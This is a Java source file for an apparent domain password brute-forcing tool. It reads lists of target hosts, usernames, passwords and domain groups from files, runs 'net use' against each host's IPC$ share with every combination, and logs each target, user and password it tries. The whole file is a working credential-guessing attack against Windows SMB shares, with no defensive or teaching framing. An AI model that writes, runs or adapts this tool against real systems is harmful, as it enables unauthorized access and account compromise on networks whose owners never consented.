import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.List;

public class FuckDomainMini {
    public static void main(String[] args) throws IOException {

//        Path IP = Paths.get("C:\\FuckDomainMini\\Dictionary\\IP.txt");
//        List<String> ip = Files.readAllLines(IP);
        Path Target = Paths.get("C:\\FuckDomainMini\\Dictionary\\TARGET.txt");
        List<String> target = Files.readAllLines(Target);
        Path Users = Paths.get("C:\\FuckDomainMini\\Dictionary\\USER.txt");
        List<String> user = Files.readAllLines(Users);
        Path Passwd = Paths.get("C:\\FuckDomainMini\\Dictionary\\PASSWD.txt");
        List<String> passwd = Files.readAllLines(Passwd);
        Path Group = Paths.get("C:\\FuckDomainMini\\Dictionary\\GROUP.txt");
        List<String> group = Files.readAllLines(Group);

        //相对路径读取文件（只能读取工程目录中的文件）
//        Path IP = Paths.get("src/IP.txt");
//        List<String> ip = Files.readAllLines(IP);
//        Path User = Paths.get("src/USER.txt");
//        List<String> user = Files.readAllLines(User);
//        Path Passwd = Paths.get("src/PASSWD.txt");
//        List<String> passwd = Files.readAllLines(Passwd);

        //List list1 = ip;
        List list1 = target;
        List list2 = user;
        List list3 = passwd;
        List list4 = group;

        for (int i = 0;i < list1.size();i++){

            //System.out.println(list1.get(i));
            //String ipList = (String) list1.get(i);
            String targetList = (String) list1.get(i);
            //System.out.println(ipList);
            for (int j = 0;j<list2.size();j++){
                String userList = (String) list2.get(j);
                //System.out.println(userList);
                for (int k = 0;k<list3.size();k++){
                    String passwdList = (String) list3.get(k);
                    //System.out.println(passwdList);
                    for (int h = 0; h < list4.size(); h++) {
                        String groupList = (String) list4.get(h);

                        //System.out.println("net use \\\\" + ipList + "\\ipc$ " + passwdList + " /user:" + userList);
                        System.out.println("net use \\\\" + targetList + "\\ipc$ " + passwdList + " /user:" + userList);

                        //Process process = Runtime.getRuntime().exec("net use \\\\" + ipList + "\\ipc$ " + passwdList + " /user:" + userList);
                        //Process process = Runtime.getRuntime().exec("net use \\\\" + targetList + "\\ipc$ " + passwdList + " /user:" + userList);
                        Process process = Runtime.getRuntime().exec
                                ("net use \\\\" + targetList + "\\ipc$ " + passwdList + " /user:" + groupList + "\\" + userList);

                        try (InputStream fis = process.getInputStream();
                             InputStreamReader isr = new InputStreamReader(fis, "GBK");
                             BufferedReader br = new BufferedReader(isr)) {
                            String line;
                            while ((line = br.readLine()) != null) {
                                System.out.println(line);
                                System.out.println("这是line的while循环");

                                PrintWriter writer = new PrintWriter
                                        (new OutputStreamWriter
                                                (new FileOutputStream("C:\\FuckDomainMini\\RESULT.txt", true), "UTF-8"));
                                //writer.println("IP:" + ipList + "\\U:" + userList + "\\P:" + passwdList);
                                writer.println("T:" + targetList + "\\U:" + userList + "\\P:" + passwdList);
                                writer.flush();
                            }
                        } catch (IOException e) {
                            throw new RuntimeException(e);
                        }
                    }
                }

            }

        }
    }
}
